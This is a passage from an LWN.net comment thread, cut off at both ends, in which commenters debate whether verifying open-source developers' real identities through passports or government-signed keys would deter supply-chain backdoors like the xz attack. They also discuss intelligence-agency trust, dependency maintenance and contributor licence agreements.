by **farnz** (subscriber, #17727)
[[Link](/Articles/967985/)]

My expectation is that the secret services etc are as much a risk to you as they are to someone you deem "trusted". Basically, by trusting people in the same immigration situation as you and in the same country as you, you're trusting people inside the same "national security" boundary as you; the moment you go outside that, you're at risk of your colleague being targeted by a national security agency that cannot reach you, even if they are an upstanding person themselves.

So, while Canada is basically a safe country, as someone based in England, I'm in a separate "national security" boundary to a Canadian; it is at least theoretically possible that a Canadian agency can't get to me, but can compromise a Canadian contact, and it's also possible for a UK agency to compromise me, while being unable to compromise my Canadian contact.

This analysis still applies even if the two countries are evildoers; my local set of evil government agencies affect me and anyone else in the same country, and your local set affect you and anyone else in the same country. If we're in different countries, and you need only affect one of us, then the set of agencies to care about is the union of the sets we're affected by.

### Verify the identity of developers

Posted Apr 3, 2024 17:39 UTC (Wed)
by **jafd** (subscriber, #129642)
[[Link](/Articles/968301/)] (1 responses)

Also, moles exist.

### Verify the identity of developers

Posted Apr 4, 2024 19:01 UTC (Thu)
by **epa** (subscriber, #39769)
[[Link](/Articles/968461/)]

Running a mole is about a million times more expensive than creating a GitHub account under a completely made-up identity. That’s the idea.

### Verify the identity of developers

Posted Mar 30, 2024 14:40 UTC (Sat)
by **dvdeug** (subscriber, #10998)
[[Link](/Articles/967436/)] (8 responses)

> resident in a Western country where they could be prosecuted for maliciously introducing backdoors.

Crypto AG was a Swiss encryption company that turned out to be owned by the CIA and West German Federal Intelligence Service (BND) between 1970 and 1993, with the CIA owning it until 2018, that sold backdoored encryption systems to many nations. The NSA produced and promoted the Dual\_EC\_DRBG CSPRNG that could be used with SSL, with the general consensus being that they had a backdoor, as the possibility of an undetectable backdoor existing was well-known and there was little other reason to use it.

Even if we trust the CIA and NSA (and friends; the Crypto AG story also implicates Germany and Switzerland) blindly, the history of espionage says little for the security of blindly trusting people resident in western nations.

### Verify the identity of developers

Posted Mar 30, 2024 16:15 UTC (Sat)
by **epa** (subscriber, #39769)
[[Link](/Articles/967473/)]

Are you saying Crypto AG was publishing all its source code and customers were doing reproducible builds of that?

I certainly do not advocate blindly trusting someone just because they are a known individual from a non-hostile country. We need all the other “many eyeballs”, verified supply chain, and sandboxing too. Once you have all that in place, the next step might be to start strongly identifying developers.

For cryptography the situation is a little different as the cipher is fully described but only experts can analyse it for weaknesses. A backdoor in a library does not require quite the same level of expertise to spot.

### Verify the identity of developers

Posted Mar 30, 2024 17:48 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967491/)] (6 responses)

> Crypto AG [...] that sold backdoored encryption systems to many nations. The NSA produced and promoted the Dual\_EC\_DRBG CSPRNG that could be used with SSL, with the general consensus being that they had a backdoor,

These are very real but they were also huge scandals. In dictatorships such stuff is business as usual.

In democracies these questions can be and are debated and there is some oversight on intelligence agencies. A poor level of control but much better than answering to a single person at the top.

Developers do not automatically risk jail or death or worse if they refuse a "proposition" from the intelligence agency of a democracy.

Democracies are fragile and very far from perfect but they're at least trying. So, verifying the identity of developers who live in a democracy would be very far from a silver bullet and I'm not even sure it would be a good idea in the first place but it would be for sure \_very\_ different from verifying the identify of developers surviving in a dictatorship.

Nothing's black and white here but there can be a huge differences between "light grey" and "dark grey"; let's be careful with "whataboutism".

PS: the main drive (and... sin) of the Western world is unabated greed and the fair dose of corruption that comes with it. Yet Western business is nowadays required to distance itself more and more from powerful dictatorships which is costing a LOT. Guess why.

### Verify the identity of developers

Posted Mar 30, 2024 18:15 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967498/)] (3 responses)

> Developers do not automatically risk jail or death or worse if they refuse a "proposition" from the intelligence agency of a democracy.

I live in a country that is theoretically a democracy but has something called "National Security Letters" that are substantially similar to this description, which makes me dubious the line is quite this clear-cut.

### Verify the identity of developers

Posted Mar 30, 2024 19:00 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967516/)] (2 responses)

I wrote "not automatically", "shades of grey" and used plenty other adverbs but apparently not enough.

### Verify the identity of developers

Posted Mar 30, 2024 19:59 UTC (Sat)
by **rra** (subscriber, #99804)
[[Link](/Articles/967536/)]

> I wrote "not automatically", "shades of grey" and used plenty other adverbs but apparently not enough.

I'm sorry, you're right, you did, and I should have acknowledged that. I still think I disagree with you somewhat about the intensity of the difference, but it's hard to quantify and there's nothing incorrect in what you said.

### Verify the identity of developers

Posted Apr 1, 2024 15:31 UTC (Mon)
by **Lennie** (subscriber, #49641)
[[Link](/Articles/967865/)]

For context, I'll post you a link to a talk by a brave man:

[https://media.ccc.de/v/27c3-4263-en-resisting\_excessive\_g...](https://media.ccc.de/v/27c3-4263-en-resisting_excessive_government_surveillance)

Resisting the state if they come knocking is euh... hard work to say the least.

Formally good actors can (be made to) turn or get their systems compromised.

Which is why we need to focus on checking code and making code more readable probably less focus less on the actors.

### Verify the identity of developers

Posted Mar 30, 2024 19:50 UTC (Sat)
by **dvdeug** (subscriber, #10998)
[[Link](/Articles/967524/)] (1 responses)

> These are very real but they were also huge scandals.

Huge scandals? Crypto AG, by the time it came out, was a minor historical note. I'd bet most Americans would consider it a good move that let us spy on foreign enemies, and many wouldn't bat an eye at the amount of spying done on allied powers. The NSA stunt annoyed some in the field of computer security, but few outside it.

> In dictatorships such stuff is business as usual.

I'm not sure. China isn't going to play around with Dual\_EC\_DRBG; you use their keys for SSL or else. They openly put taps in, and wouldn't bother with something nobody is going to trust. This skullduggery is part and parcel of Western intelligence agencies.

> Developers do not automatically risk jail or death or worse if they refuse a "proposition" from the intelligence agency of a democracy.

[https://arstechnica.com/tech-policy/2013/04/wikipedia-edi...](https://arstechnica.com/tech-policy/2013/04/wikipedia-editor-allegedly-forced-by-french-intelligence-to-delete-classified-entry/) There's a risk of jail time. Nor do I think US intelligence agencies are above blackmail, though the CIA might reserve that for people outside the US.

> Nothing's black and white here but there can be a huge differences between "light grey" and "dark grey"

Yes, but at the same time, intelligence agencies, democracy or otherwise, are very clandestine and have a history of this type of stuff.

As another note, a new developer from the Western world could be a genuine newbie, but could also be someone who found a job posting on the dark web when looking to buy the "Easy Home Kit for Cooking Meth", and now gets paid for his identity, quite possibly with no idea who is paying him.

> Yet Western business is nowadays required to distance itself more and more from powerful dictatorships which is costing a LOT. Guess why.

More and more? If we're talking about China, it's got Cold War parallels, two large powers fighting over control of the world. Russia has even more Cold War parallels, and while pulling out of Russia is bad for business, so is letting Russia take over Eastern Europe. There's moral elements, and fears that Chinese products have backdoors. I'm really not sure what you're getting at here. I certainly don't see Western business having much trouble dealing with dictatorships that haven't pissed off the West.

### Verify the identity of developers

Posted Apr 1, 2024 0:24 UTC (Mon)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967748/)]

> Huge scandals? Crypto AG, by the time it came out, was a minor historical note.

It was probably not mentioned in family dinners but it made the mainstream press which is very rare for topics like this. It also taught many "naive" countries to stop blindly trusting their allies. So yes, it was a pretty big deal.

> [https://arstechnica.com/tech-policy/2013/04/wikipedia-edi...](https://arstechnica.com/tech-policy/2013/04/wikipedia-editor-allegedly-forced-by-french-intelligence-to-delete-classified-entry/) There's a risk of jail time.

Whether this particular case has merit or not, publishing classified information is of course pretty stupid and totally unrelated to inserting backdoors in open source projects.

> but could also be someone who found a job posting on the dark web

Yes verifying identities will never be a silver bullet. But it would be for sure more useful in a place with a functional legal system where such a person runs the risk of being caught and prosecuted (as opposed to getting a medal from their dictator).

> I'm really not sure what you're getting at here. I certainly don't see Western business having much trouble dealing with dictatorships that haven't pissed off the West.

My (admittedly confusing) tangent/PS was: businesses and monopolies tend to buy congressmen and run the show in democracies, especially in the US since "Citizens United vs FEC". As you noted, businesses generally don't care about dictatorships, only about money. That's why they are called "businesses". But even in these short-sighted, market-based countries, authorities are starting to realize the magnitude of the risks and problems and are (slowly) taking precautions affecting the bottom line of their uber rich and all powerful businesses. The IT naivety is (slowly) regressing and that's a good thing.

### Verify the identity of developers

Posted Mar 30, 2024 15:39 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967466/)] (5 responses)

> ... and accepting the fact that we will never have enough reviewers to check every commit, ...

This is the main problem right here and the "solution" is to just SLOW DOWN. No xz maintainer? Fine, no xz software at all. The world will keep spinning.

This site is never short of very valid criticism of greedy corporations exploiting exhausted maintainers. But sometimes it would also be good to look in the mirror and at the attitude of some maintainers. Scratching your own itch and sharing your random and insecure musings on the Internet is great. But when that pet project becomes popular hubris kicks in. Then comes the desire to become popular and successful too and to avoid a fork at all costs: someone else more "active" and more lax could fork and reap all the fame! Quick, quick, let's merge all these great new features that I have barely the time to look at. Who knows: someone somewhere could be interested in them?

The number 1 job of a good maintainer is to say "no" or even (the horror!) completely ignore some ideas and submissions. The Linux kernel is not perfect but actually decent at this. The rest of what runs on a Linux desktop... not so much.

It's not just corporations: many consumers, developers and generally \_people\_ generally don't want to pay for quality. We just want more and more for less and less money. With just one exception: security. Because a device that grants criminals access to your data and passwords is much scarier than a device that stops working. So security has been saving quality and it will keep slowing things down. That's a good thing.

### Verify the identity of developers

Posted Mar 30, 2024 15:43 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967468/)]

> don't want to pay for quality. [...] With just one exception: security.

Sorry I forgot the other, obvious exception: dying. For instance: in a Boeing plane.

### Verify the identity of developers

Posted Mar 30, 2024 15:53 UTC (Sat)
by **pizza** (subscriber, #46)
[[Link](/Articles/967470/)] (3 responses)

> This is the main problem right here and the "solution" is to just SLOW DOWN. No xz maintainer? Fine, no xz software at all. The world will keep spinning.

Ok, so widely-user xz stops being maintained. The amount of collective effort to remove xz from production dwarfs the effort of maintaining xz. By multiple orders of magnitude.

Meanwhile, as this mess demonstrates, "maintained" doesn't mean it can be trusted.

### Verify the identity of developers

Posted Mar 30, 2024 17:04 UTC (Sat)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967479/)] (2 responses)

> Ok, so widely-user xz stops being maintained.

This already happened a while ago but that wasn't my main point. My main point is: how was 20% better compression enough to "lure" projects into adding some bad dependency? \_This\_ is when projects should "slow down" and take the time to weight all the pros and cons, including future maintenance headaches

[https://cacm.acm.org/practice/surviving-software-dependen...](https://cacm.acm.org/practice/surviving-software-dependencies/)

> The amount of collective effort to remove xz from production dwarfs the effort of maintaining xz. By multiple orders of magnitude.

This is comparing apples and oranges because it's not the same people. There's no "collective" either: each project should manage its dependencies independently.

I'm surprised that switching to a different compression is so expensive because many projects offer such a choice at configuration time which hints at comparable APIs.

> "maintained" doesn't mean it can be trusted.

Indeed but "unmaintained" cannot be trusted \_for sure\_. Same as testing: it can only "prove the existence of bugs, not their absence". Quality is not black or white.

> Meanwhile, as this mess demonstrates,

If anything, this mess demonstrated a lack of maintenance.

### Verify the identity of developers

Posted Mar 31, 2024 21:19 UTC (Sun)
by **calumapplepie** (guest, #143655)
[[Link](/Articles/967735/)] (1 responses)

> My main point is: how was 20% better compression enough to "lure" projects into adding some bad dependency?

Because it wasn't a bad dependency, and 20% is a big improvement. xz has (had?) a website, multiple contributors, maintainers, and more. There were heated debates over the advantages of it compared to other tools. Eventually, it gained wide use, because 20% faster downloads, 20% less storage, 20% lower bandwidth fees, and a 20% better algorithm was an upgrade.

> This is comparing apples and oranges because it's not the same people. There's no "collective" either: each project should manage its dependencies independently.

Then we will have 60% of projects continue using XZ for years after it is abandoned. Besides, the idea of projects as a bunch of little silos that all know each other and work together isn't realistic; lots of contributions are drive-by, and lots of contributors are involved in many projects.

> If anything, this mess demonstrated a lack of maintenance.

XZ was and is maintained. It was subjected to continuous fuzzing as a part of Googles OSS-fuzz. It was vendored into the Linux kernel, an "essential" part of Debian, and more. There isn't a maintainer on the planet who would have rejected its inclusion because of reputational fears.

Do we need more auditing? Yes. Maybe some clever person can think of linker patches that will catch this particular exploit technique, or maybe we need to have more people running with the options that exist to catch it, or maybe even someone should write some automated tests. But rogue maintainers was and will remain a problem.

### Verify the identity of developers

Posted Apr 1, 2024 0:04 UTC (Mon)
by **marcH** (subscriber, #57642)
[[Link](/Articles/967747/)]

> xz has (had?) a website, multiple contributors, maintainers, and more. [...] XZ was and is maintained.

Did you read the news?

> Then we will have 60% of projects continue using XZ for years after it is abandoned. Besides, the idea of projects as a bunch of little silos that all know each other and work together isn't realistic; lots of contributions are drive-by, and lots of contributors are involved in many projects.

I don't get the point you're trying to make here.

In any case adding and managing dependencies is a benefit-risk assessment and it's up to each project to make its own decisions in a decentralized manner; there is simply no alternative besides not making this assessment.

"Decentralized" does not mean "in a vacuum": more popular dependencies are of course more likely to be picked up or forked by someone who really needs them if the current maintainer(s) fail.

### Verify the identity of developers

Posted Mar 30, 2024 20:29 UTC (Sat)
by **pawel44** (guest, #162008)
[[Link](/Articles/967496/)]

> Then for key roles you could require someone with a clear track record and resident in a Western country where they could > be prosecuted for maliciously introducing backdoors.

Was NSA prosecuted?

### Verify the identity of developers

Posted Mar 31, 2024 11:05 UTC (Sun)
by **dkzm** (guest, #55549)
[[Link](/Articles/967653/)] (53 responses)

Let's suppose somebody add drivers for yet another Chinese SBC or making QEMU's COLO feature (VMware FT equivalent, at least partially developed by Huawei as far as I understood) really working or just new and improved quantization format for LLMs to textgenweb ui. Or just some new improvments to Linux network stack (Huawei did this as far as I remember)

They are not from Western country (they are likely from China). Shouldn't github just refuse their access? They just use their own services, blame it on github being unwelcoming to them. West will not be able to use and learn their could and they would still be able to do so. This likely mean that all major opensources projects will be forked and it it's possible that github 'original' will not be most maintained branch anymore.

### Verify the identity of developers

Posted Mar 31, 2024 17:53 UTC (Sun)
by **epa** (subscriber, #39769)
[[Link](/Articles/967711/)] (52 responses)

I didn't mean blocking anyone from gitlab or even blocking them from committing. I meant given a particular git repository being able to see the people who have committed to it, and whether their identity has been verified as a real person. Whether to then "trust" that repository is a policy decision and would be made by distributors or perhaps your company's IT department. People are already making these decisions; given that we face attempts to introduce backdoors under fake identities like "Jia Tan", having some extra information about whose identity has been verified might help make better decisions.

### Verify the identity of developers

Posted Mar 31, 2024 18:12 UTC (Sun)
by **pizza** (subscriber, #46)
[[Link](/Articles/967714/)] (51 responses)

> given that we face attempts to introduce backdoors under fake identities like "Jia Tan", having some extra information about whose identity has been verified might help make better decisions.

What does "verified" mean in this context?

### Verify the identity of developers

Posted Apr 1, 2024 6:31 UTC (Mon)
by **epa** (subscriber, #39769)
[[Link](/Articles/967761/)] (50 responses)

I was imagining a future where GitLab verifies the identity of people using an identity document such as a passport. Of course, that’s currently not practical. It would require governments to issue electronic identities by signing someone’s private key or the like. Which could happen in Estonia but for various reasons seems out of reach in the USA. Actually, GitLab need not be involved, if you can tie back a private key to a named individual and commits are signed.

And I did say it would be somewhat dystopian and not desired by free software developers.

It would not be watertight but would make things a bit more difficult for an organization that wants to get maintainer permissions in a project and add malicious code. Currently, creating a fake identity is trivially easy.

### Verify the identity of developers

Posted Apr 1, 2024 6:45 UTC (Mon)
by **mjg59** (subscriber, #23239)
[[Link](/Articles/967764/)] (49 responses)

If we're in a world where we're dealing with state level attackers we should assume that they're going to be able to produce ID that's good enough to pass any viable non-government checks, and so you end up with something that deters legitimate contributors without preventing the worst case failures.

### Verify the identity of developers

Posted Apr 1, 2024 7:08 UTC (Mon)
by **himi** (subscriber, #340)
[[Link](/Articles/967765/)] (48 responses)

Yes and no.

Yes, nation state attackers have the capacity to forge ID that will pass any viable checks (non-government or government) - history has given us many examples. But, when those nation states have been caught out doing so it has the potential to result in the kind of negative impacts that nation states actually take seriously - diplomatic incidents, visa refusals or revocations, even changes to policies on visa applications. Sure, true rogue states probably don't care that much about that kind of thing, but anyone that doesn't want to be /considered/ a rogue state by most of the world will care.

Not that I think this is a good argument for requiring real-world ID to be able to make legitimate contributions to free software projects, but it's definitely worth remembering that when real-world ID gets involved the consequences for a lot of things, both good /and/ bad, escalate rather quickly.

### Verify the identity of developers

Posted Apr 1, 2024 7:22 UTC (Mon)
by **mjg59** (subscriber, #23239)
[[Link](/Articles/967768/)] (47 responses)

Mossad agents used fake Canadian passports in an assassination, and the meaningful impact on their international reputation was approximately zero. And it was only possible to determine that because there were alternative pathways to identify who the agents were, what their legitimate nationality was, and how they had entered the country anyway. Without building an incredible amount of infrastructure there's no real way to flag an identity as false until they've already done something illegitimate, and even then if you can't identify the underlying identity you're probably not going to be able to figure out who issued the false identity. Unless you want every contribution to be subject to the same criteria as entering a foreign country, I just don't think this is a meaningful speedbump.

### Verify the identity of developers

Posted Apr 3, 2024 8:04 UTC (Wed)
by **epa** (subscriber, #39769)
[[Link](/Articles/968132/)] (46 responses)

The fake Canadian passports must have worked because immigration officers just looked at them. They didn’t check them against a database maintained by the Canadian government. I am not completely certain, but I know that in Europe a passport is not just eyeballed but \*scanned\* using its RFID chip, or at least the computer-readable text printed on it. And within the European Union at least, it gets checked against a database. So you can’t just print one that looks convincing.

(Unless of course the Mossad operatives took on the identity of real Canadians and looked like them too, so they could in principle have stolen those people’s real passports and used them to travel. I am have been assuming they created entirely fake identities.)

How does this relate to checking the identity of programmers? Well, a requirement of “please take a photo of your passport” wouldn’t cut it. But if governments provide a way to validate the passport data (or for an individual to generate a code which can be checked on a govt website, as already happens in some countries) then we do make it harder to create fake identities. A step further would be for an individual to have their public key signed by a government agency. You could at least check the person’s real name and nationality. That’s a lot better than “Jia Tan”.

### Verify the identity of developers

Posted Apr 3, 2024 12:53 UTC (Wed)
by **smurf** (subscriber, #17840)
[[Link](/Articles/968179/)]

> if governments provide a way to validate the passport data

Not that difficult to do given reasonably useable infrastructure. In Germany you don't even need direct support from the government to do it (other than having a RFID chip in your document in the first place of course): there's an online service from Governikus that transmogrifies the electronic data in your ID card to a GPG signature. See e.g. mine at 72CF8E5E25B4C293, signed by 5E5CCCB4A4BF43D7.

### Verify the identity of developers

Posted Apr 4, 2024 14:17 UTC (Thu)
by **kleptog** (subscriber, #1183)
[[Link](/Articles/968382/)] (44 responses)

Apps that can validate your passport via the NFC chip are fairly common these days. You can open a bank account online by holding your phone to your passport, and then letting it take a picture of your face. It's all held together with public key cryptography. I'm not sure if the CRL for passports is publically available, but it does exist.

Maybe not in the US though?

But that doesn't really help though, because all it proves is that someone has access to a passport. That doesn't tell you if they're trustworthy or not. And since you're not going to be scanning someone elses passport in the end you're going to be trusting who ever did that the person was actually there, so you've just moved the problem around.

In the end you can never be 100% sure someone is trustworthy. No technical solution can do that. But perhaps we can make a machine learning system that can monitor commits for dodgy stuff to make it feasible for humans to focus on the risky patches.

### Verify the identity of developers

Posted Apr 4, 2024 18:59 UTC (Thu)
by **epa** (subscriber, #39769)
[[Link](/Articles/968459/)]

If the developer’s public key is signed by a government agency and linked to their identity document (as apparently can be done in Germany) that is a stronger check than just checking a passport and associating it with a public key uploaded separately.

None of this is completely watertight. But right now it’s kind of embarrassing how easy it is to create a fake identity and use it to contribute or even become maintainer of a project.

### Verify the identity of developers

Posted Apr 4, 2024 19:33 UTC (Thu)
by **draco** (subscriber, #1792)
[[Link](/Articles/968473/)] (42 responses)

Passports establish identity and jurisdiction (for extradition if necessary) for claims of torts and charges of crimes.

It's not about whether they can be trusted, but about whether they can be held accountable if they do something bad.

By comparison, as we've seen, an email, public key, and purported name are nearly useless for these purposes.

(It hopefully goes without saying that these all need to be tied together to one person to be useful, but it was apparently not obvious why a passport helps, so I figured I'd be upfront with that detail.)

### Verify the identity of developers

Posted Apr 4, 2024 19:37 UTC (Thu)
by **mss** (subscriber, #138799)
[[Link](/Articles/968474/)]

Passports establish identity and jurisdiction (for extradition if necessary) for claims of torts and charges of crimes.

It's not about whether they can be trusted, but about whether they can be held accountable if they do something bad.

That's not very useful for a nation-state-sponsored attack like (most likely) this one.

### Verify the identity of developers

Posted Apr 4, 2024 19:43 UTC (Thu)
by **pizza** (subscriber, #46)
[[Link](/Articles/968475/)] (39 responses)

> Passports establish identity and jurisdiction (for extradition if necessary) for claims of torts and charges of crimes.

Then there's the little problem that most people don't have passports.

So you'd need to handle (and have a way of validating) nearly 200 (non-standarized) national identity documents. Then there are countries like the US that don't have a single (domestic-focused) nation-wide ID [1].

[1] eg the USA, with 50 states, plenty of non-state territories (eg DC and Puerto Rico) and various native tribal IDs, plus military and other federally-issued IDs, and so forth...)

### Verify the identity of developers

Posted Apr 5, 2024 9:46 UTC (Fri)
by **smurf** (subscriber, #17840)
[[Link](/Articles/968515/)] (38 responses)

> Then there's the little problem that most people don't have passports.

That's likely true if you talk about the world's population as an aggregate.

The actual rate varies rather wildly between countries, and their subpopulation (I'd assume that IT affine people are somewhat more likely to have one than not, for instance).

### Verify the identity of developers

Posted Apr 5, 2024 12:20 UTC (Fri)
by **pizza** (subscriber, #46)
[[Link](/Articles/968534/)] (37 responses)

> The actual rate varies rather wildly between countries, and their subpopulation (I'd assume that IT affine people are somewhat more likely to have one than not, for instance).

You're probably right, but I'd still be surprised if a majority "IT people" in the US have a passport.

(And EU citizens don't need a passport to travel within the EU either)

### Verify the identity of developers

Posted Apr 5, 2024 12:55 UTC (Fri)
by **atnot** (subscriber, #124910)
[[Link](/Articles/968536/)] (9 responses)

This entire discussion is just moot in the first place, because if some project requires me to scan my passport to contribute, I will simply not contribute to that project. And experience show few people will. \*Especially\* if that means you take on some sort of legal liability for your contributions, which just, hell no.

Look at CLAs, most people already can't be bothered to e-sign some document in docusign or whatever.

And it's the wrong direction to discuss this anyway. Sure, verifying passports would be a way to verify that people contributing to \*your\* project are people recognized by some sort of UN government (lots of people aren't, but let's put that aside). But if, say, sqlite, gcc, freebsd, linux or whatever organizations your systems depend on isn't going to enforce your draconian policy, what are you going to do? Or if they do, and a fork develops that just lets people contribute without any riffraff? Are you going to not package their software and everything that depends on it? Rewrite the whole thing from scratch? You can't trust any of their commits after all. Put the stuff without passport checks in a seperate repository, which everyone just enables blindly because that's what you actually need to do to get real work done, just like people already do with rpmfusion and universe and flatpak and pypi and everything else?

It's just a completely unrealistic model of free software development that assumes a "supply chain" and an avenue for contractual obligations that just does not exist, cannot exist and is deeply undesired by all of the people this industry runs on, those who publish their code online because it brings them joy.

### Verify the identity of developers

Posted Apr 5, 2024 13:43 UTC (Fri)
by **farnz** (subscriber, #17727)
[[Link](/Articles/968549/)]

> … assumes a "supply chain" and an avenue for contractual obligations that just does not exist, cannot exist and is deeply undesired by all of the people this industry runs on, those who publish their code online because it brings them joy.

This is the key point; if you're going to "solve" this problem, you need to start at the producer end, since the consumers of Free Software have no leverage over the producers in general (you may have leverage in specific cases - say if you employ a producer of Free Software and can threaten their livelihood - but not over the full sum of Free Software).

If you can't come up with a good reason why you'd jump through the hoops you're putting in place to fix a typo in a message the program displays (say changing "the" to "The" because of context), then your hoops are not going to work in general, since there will be plenty of producers of best-in-class Free Software who refuse to jump through your hoops.

### Verify the identity of developers

Posted Apr 6, 2024 13:14 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/968676/)] (7 responses)

> Look at CLAs, most people already can't be bothered to e-sign some document in docusign or whatever.

The problem with CLAs isn't that I can't be bothered.

The problem is that assigning my copyright, or the rights thereof (you can't "assign copyright" in some jurisdictions; you created it, you have the copyright, period end of discussion, presuming you didn't do it for an employer) is a very bad idea because it allows the transferee to re-license the work under any proprietary legalese they damn well please. Numerous examples can readily be found in the archives, of LWN and elsewhere.

Showing my passport / ID document to somebody doesn't take away any of my rights.

XZ and of course a whole freakin' lot of other software is the equivalent of critical infrastructure. In most countries, if I want to hire you to work on anything critical, you showing me some official ID document is just the first step in a rather long list of intrusive government snoopage, depending on quite how critical the piece you'd then be able to subvert is; including but \*way\* not limited to checking that you don't have relatives in $BAD\_COUNTRY whose health would be a convenient handle their government might blackmail you with.

You don't want that? fine, go work somewhere else.

### Verify the identity of developers

Posted Apr 6, 2024 16:42 UTC (Sat)
by **atnot** (subscriber, #124910)
[[Link](/Articles/968717/)] (3 responses)

Okay, I'll work on something else. And then it will become useful, and lots of people will want to

install it on your distro. And then it ends up becoming critical. What are you gonna do then?

You can say how it would work if this was a company again and again. But this isn't a company. It very explicity and deliberately does not work like a company.

You can't just handwave some sort of contractual customer relationship between someone uploading code on the internet and other people chosing to use it in critical ways of their own accord, that's just not how things work.

### Verify the identity of developers

Posted Apr 6, 2024 18:14 UTC (Sat)
by **smurf** (subscriber, #17840)
[[Link](/Articles/968724/)] (2 responses)

Surprise: I know that.

> You can say how it would work if this was a company again and again.

I don't recall saying anything more than once.

Also I didn't say that "this", whatever it is, should work like a company. Or that I'm advocating for doing things that way.

All I'm saying is that compared to the security (both real and theater) you're subjected to when working on "this" in a corporate context, requesting something that links your online identity with what most people consider to be the Real World isn't \*that\* much of a burden.

Given this attack, the idea of finding some middle ground between "you're a $NATION black hat? sure, no prob, here are the keys" and the (IMHO somewhat excessive) hoops the corporate world requires you to jump through when you want to do the exact same thing for $$$ isn't \*that\* far out.

So we get to talk about it.

There's a material difference between discussing ways to ID people working on critical code and concluding that it's not practical and finding some other way to reach the same goal (clean up our tooling, pay somebody to do code reviews, whatever) and declaring a priori that the topic is not up for discussion because "that's just not how things work".

### Verify the identity of developers

Posted Apr 6, 2024 18:26 UTC (Sat)
by **mjg59** (subscriber, #23239)
[[Link](/Articles/968726/)] (1 responses)

Linking "online identity" to "real world identity" is a great way to dissuade a significant number of people from participating in free software, and at this point we have no evidence whatsoever it would have done anything to help in the case in question.

### Verify the identity of developers

Posted Apr 6, 2024 19:06 UTC (Sat)
by **Wol** (subscriber, #4433)
[[Link](/Articles/968735/)]

And what smurf is conveniently forgetting is that my pet project may or may not be critical to me. If it's critical to someone else - NOT MY PROBLEM!

"We get to talk about it". And the FIRST thing I'm going to talk about is £££. At which point if you don't want to pay - or I don't want the money! - we're at an impasse.

At the end of the day, there has to be a MUTUAL EXCHANGE OF VALUE. And smurf is assuming he has something of value to offer - BAD ASSUMPTION! I don't know about other people, but as far as I'm concerned, if it involves dealing with the US Authorities, my price is likely to be "Up Yours!!!"

"So we get to talk about it." "Feel free to fork it. I don't care".

Cheers,

Wol

### Verify the identity of developers

Posted Apr 6, 2024 16:53 UTC (Sat)
by **farnz** (subscriber, #17727)
[[Link](/Articles/968721/)] (2 responses)

When xz started, and indeed when most of the open source that's now "critical infrastructure" started, it was just a hobby project, and not critical. It became critical because it was useful and became used; but that's on the users, not the developers.

Or are you saying that I'm allowed to demand that you go through a very long list of government snoopage because I've used your comment in something critical, and you now owe me big time for my decision to make use of your work?

### Verify the identity of developers

Posted Apr 7, 2024 2:35 UTC (Sun)
by **draco** (subscriber, #1792)
[[Link](/Articles/968766/)] (1 responses)

No, I think it's the other way around

Perhaps I don't want the reputational damage of having nation state attacks on my project, so I insist on knowing that the patches I accept are from real, identifiable people from countries I trust

Maybe nobody contributes to my project, maybe I'm ok with that, maybe some people feel better about my project because of that policy

Maybe people who don't like that choose to fork it, that's their right, but then they accept the consequences

Or maybe they do the same thing, but with different trust decisions about who's ok 😂🤷

A variant of this has happened before: DJB is very opinionated about what goes into his software

Is this a good approach? The proof won't be in any arguments about it, but in what actually happens

### Verify the identity of developers

Posted Apr 7, 2024 11:17 UTC (Sun)
by **farnz** (subscriber, #17727)
[[Link](/Articles/968779/)]

But what if you yourself are a nation state attacker? How do I know when I look at something and consider using it that you're trustworthy? How do I as a potential user get you to jump through my hoops that confirm that you are a real, identifiable person from a country I trust?

And remember that for a lot of contributions, I can see that they're safe by review; why would I demand anything from a contributor when it's obvious to me that the change is good as-is? For code where I can't completely review it, I need some degree of trust, but where I can review in full, why would I put you through a barrage of trust checks just to go 'yep, I can see that changing "correct. the system" to "correct. The system" is a good change to make'?

### Verify the identity of developers

Posted Apr 5, 2024 12:55 UTC (Fri)
by **paulj** (subscriber, #341)
[[Link](/Articles/968540/)] (26 responses)

EU citizens \*do\* need some form of official ID (e.g. passport, driving licence, national ID card) to travel between at least some of the EU.

Citizens (and possibly also residents) do not need ID to travel within the Schengen Area. Now, the Schengen Area includes nearly all EU members, but not all. Notably, the 2 island member states are not in Schengen, Ireland and Malta - Ireland can not join Schengen because the UK has never wanted to join, and Ireland has always had an open border with the UK, and will have for the foreseeable future. Malta, not sure why, but perhaps that's also to do with UK relations - however it will be joining at some point soon. Additionally, the EFTA states, and a couple of others, are also in Schengen - but not in EU.

### Verify the identity of developers

Posted Apr 5, 2024 12:59 UTC (Fri)
by **paulj** (subscriber, #341)
[[Link](/Articles/968541/)]

tl;dr: You need an ID to travel to/from Ireland ;)

Cause of the Brits.

### Verify the identity of developers

Posted Apr 5, 2024 14:36 UTC (Fri)
by **jem** (subscriber, #24231)
[[Link](/Articles/968576/)] (24 responses)

>Citizens (and possibly also residents) do not need ID to travel within the Schengen Area.

This is a common misconception. EU citizens are required to carry a government issued ID card or passport if they are traveling abroad, even if the travel is limited within the Schengen area. However, the ID is normally not checked at the border between two Schengen countries, but checks can be reinstated if circumstances require it.

In some countries within the Schengen area (\*cough\* Germany) citizens are required to be in possession of an ID card (or passport) even within their own country.

### Verify the identity of developers

Posted Apr 5, 2024 14:56 UTC (Fri)
by **rschroev** (subscriber, #4164)
[[Link](/Articles/968588/)]

> In some countries within the Schengen area (\*cough\* Germany) citizens are required to be in possession of an ID card (or passport) even within their own country.

Same in Belgium. In practice in everyday life in most situations this is not enforced, but police enforcement can ask for your ID (I think they have to state why they do) when they feel you're causing trouble.

### Verify the identity of developers

Posted Apr 5, 2024 18:36 UTC (Fri)
by **pizza** (subscriber, #46)
[[Link](/Articles/968614/)] (21 responses)

My point was that as a EU citizen you don't need a \*passport\* to travel around the EU; your national ID card is sufficient. Only when traveling outside the EU would a passport come into play.

What makes passports semi-feasible for "identity verification" is that there is a true international standard for machine readability (and decoding) of their information. But passports are not a given, meaning you'd realistically need to accept various [sub-]national ID cards in all their infinite diversity, with potentially a separate reading/decoding/verification mechanism required for each issuing agency.

### Verify the identity of developers

Posted Apr 6, 2024 21:31 UTC (Sat)
by **kleptog** (subscriber, #1183)
